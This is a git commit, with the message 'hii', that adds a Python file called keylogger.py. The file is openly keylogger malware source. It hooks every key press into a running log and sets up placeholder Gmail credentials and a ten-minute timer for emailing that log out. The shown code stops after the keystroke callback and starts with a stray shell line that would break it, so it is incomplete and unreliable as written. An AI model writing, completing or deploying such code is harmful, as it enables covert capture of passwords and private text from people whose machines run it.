a3b2573869ee4c8c8f26b8fa7925769a023f6e7d
Slyrack04 <131754668+Slyrack04@users.noreply.github.com>
2023-06-23 10:13:50 +0200

    hii

---
+++ keylogger.py
@@ -0,0 +1,45 @@
+$ pip install Keyboard
+import keyboard # for keylogs
+import smtplib # for sending email using SMTP protocol (gmail)
+# Timer is to make a method runs after an `interval` amount of time
+from threading import Timer
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+SEND_REPORT_EVERY = 600 # in seconds, 60 means 1 minute and so on
+EMAIL_ADDRESS = "email@provider.tld"
+EMAIL_PASSWORD = "password_here"
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        # finally, add the key name to our global `self.log` variable
+        self.log += name
